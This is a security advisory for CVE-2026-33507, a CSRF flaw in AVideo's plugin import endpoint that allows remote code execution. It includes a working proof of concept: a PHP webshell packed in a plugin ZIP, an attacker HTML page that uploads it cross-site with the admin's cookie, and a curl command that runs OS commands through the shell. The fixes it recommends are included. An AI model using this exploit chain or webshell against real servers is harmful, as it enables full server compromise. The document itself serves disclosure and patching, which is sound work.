# [H] AVideo Affected by CSRF on Plugin Import Endpoint Enables Unauthenticated Remote Code Execution via Malicious Plugin Upload

## Summary
Severity: High
Advisory: GHSA-hv36-p4w4-6vmj
CVE: CVE-2026-33507
CWE: CWE-352
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-20
Source: https://github.com/advisories/GHSA-hv36-p4w4-6vmj
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The `objects/pluginImport.json.php` endpoint allows admin users to upload and install plugin ZIP files containing executable PHP code, but lacks any CSRF protection. Combined with the application explicitly setting `session.cookie_samesite = 'None'` for HTTPS connections, an unauthenticated attacker can craft a page that, when visited by an authenticated admin, silently uploads a malicious plugin containing a PHP webshell, achieving Remote Code Execution on the server.

## Details

The root cause has two components working together:

**1. SameSite=None on session cookies (`objects/include_config.php:134-137`):**

```php
if ($isHTTPS) {
    ini_set('session.cookie_samesite', 'None');
    ini_set('session.cookie_secure', '1');
}
```

This explicitly allows browsers to include the session cookie on cross-origin requests to the AVideo instance.

**2. No CSRF protection on pluginImport.json.php (`objects/pluginImport.json.php:18`):**

```php
if (!User::isAdmin()) {
    $obj->msg = "You are not admin";
    die(json_encode($obj));
}
```

The endpoint only checks `User::isAdmin()` via the session. There is:
- No CSRF token validation (the `verifyToken`/`globalToken` mechanism used elsewhere is absent)
- No `allowOrigin()` call (contrast with `objects/videoAddNew.json.php` which calls `allowOrigin()` at line 8)
- No `Referer` or `Origin` header validation
- No requirement for custom headers (e.g., `X-Requested-With`)

The upload form at `view/managerPluginUpload.php` also contains no CSRF token — it's a plain `<form enctype="multipart/form-data">` with a file input.

**Why the attack bypasses CORS preflight:** `multipart/form-data` is a CORS-safelisted Content-Type, so a `fetch()` call with `mode: 'no-cors'` and `credentials: 'include'` sends the request directly without an OPTIONS preflight. The attacker cannot read the response, but the side effect — plugin installation and PHP file extraction to the web-accessible `plugin/` directory — is the objective.

**Why secondary PHP files are not validated:** The ZIP validation (lines 67-152) thoroughly checks for path traversal, dangerous extensions (`.phtml`, `.phar`, `.sh`, etc.), and verifies the main plugin file extends `PluginAbstract`. However, `.php` is intentionally not in the `dangerousExtensions` list (it's a plugin system), and only the main file (`PluginName/PluginName.php`) is checked for the `PluginAbstract` pattern. Any additional `.php` files in the ZIP are extracted without content inspection.

## PoC

**Step 1: Create the malicious plugin ZIP**

```bash
mkdir -p EvilPlugin
# Main file — passes PluginAbstract validation
cat > EvilPlugin/EvilPlugin.php << 'PLUG'
<?php
class EvilPlugin extends PluginAbstract {
    public function getTags() { return array(); }
    public function getDescription() { return "test"; }
    public function getName() { return "EvilPlugin"; }
    public function getUUID() { return "evil-0000-0000-0000"; }
    public function getPluginVersion() { return "1.0"; }
    public function getEmptyDataObject() { return new stdClass(); }
}
PLUG

# Secondary file — webshell, NOT checked for PluginAbstract
cat > EvilPlugin/cmd.php << 'SHELL'
<?php if(isset($_GET['c'])) system($_GET['c']); ?>
SHELL

zip -r evil-plugin.zip EvilPlugin/
```

**Step 2: Host the CSRF exploit page**

```html
<!DOCTYPE html>
<html>
<body>
<h1>Loading...</h1>
<script>
// Minimal ZIP with EvilPlugin/EvilPlugin.php and EvilPlugin/cmd.php
// In practice, the attacker would embed the base64-encoded ZIP bytes here
async function exploit() {
    const zipResp = await fetch('evil-plugin.zip');
    const zipBlob = await zipResp.blob();

    const formData = new FormData();
    formData.append('input-b1', zipBlob, 'evil-plugin.zip');

    fetch('https://TARGET_AVIDEO_INSTANCE/objects/pluginImport.json.php', {
        method: 'POST',
        body: formData,
        mode: 'no-cors',
        credentials: 'include'
    });
}
exploit();
</script>
</body>
</html>
```

**Step 3: Admin visits attacker's page while logged into AVideo over HTTPS**

The browser sends the multipart/form-data POST with the admin's `PHPSESSID` cookie (allowed by `SameSite=None`). The server processes the upload, validates the ZIP structure, and extracts it to `plugin/EvilPlugin/`.

**Step 4: Attacker accesses the webshell**

```bash
curl 'https://TARGET_AVIDEO_INSTANCE/plugin/EvilPlugin/cmd.php?c=id'
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Impact

- **Remote Code Execution:** An unauthenticated attacker achieves arbitrary OS command execution on the AVideo server by exploiting a logged-in admin's session.
- **Full server compromise:** The webshell runs as the web server user (`www-data`), enabling data exfiltration, lateral movement, database access, and further privilege escalation.
- **No attacker account needed:** The attacker requires zero privileges on the target system — only that an admin visits a page they control.
- **Stealth:** The attack is invisible to the admin (fire-and-forget side-effect request). The `no-cors` mode means no visible error or redirect.

## Recommended Fix

**1. Add CSRF token validation to `objects/pluginImport.json.php`** (primary fix):

```php
// After the isAdmin() check at line 18, add:
if (!User::isAdmin()) {
    $obj->msg = "You are not admin";
    die(json_encode($obj));
}

// Add CSRF protection
allowOrigin();

// Also validate a CSRF token
if (empty($_POST['globalToken']) || !verifyToken($_POST['globalToken'])) {
    $obj->msg = "Invalid CSRF token";
    die(json_encode($obj));
}
```

**2. Update the upload form in `view/managerPluginUpload.php`** to include the token:

```html
<form enctype="multipart/form-data">
    <input type="hidden" name="globalToken" value="<?php echo getToken(); ?>">
    <input id="input-b1" name="input-b1" type="file" class="">
</form>
```

And pass it in the JavaScript upload config:

```javascript
$('#input-b1').fileinput({
    uploadUrl: webSiteRootURL + 'objects/pluginImport.json.php',
    uploadExtraData: { globalToken: $('input[name=globalToken]').val() },
    // ...
});
```

**3. Consider changing `SameSite=None` to `SameSite=Lax`** unless cross-origin cookie inclusion is specifically required for application functionality. `Lax` prevents cross-site POST requests from including cookies, which would mitigate this and similar CSRF vectors application-wide.

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-hv36-p4w4-6vmj
- https://nvd.nist.gov/vuln/detail/CVE-2026-33507
- https://github.com/WWBN/AVideo/commit/d1bc1695edd9ad4468a48cea0df6cd943a2635f3
- https://github.com/WWBN/AVideo
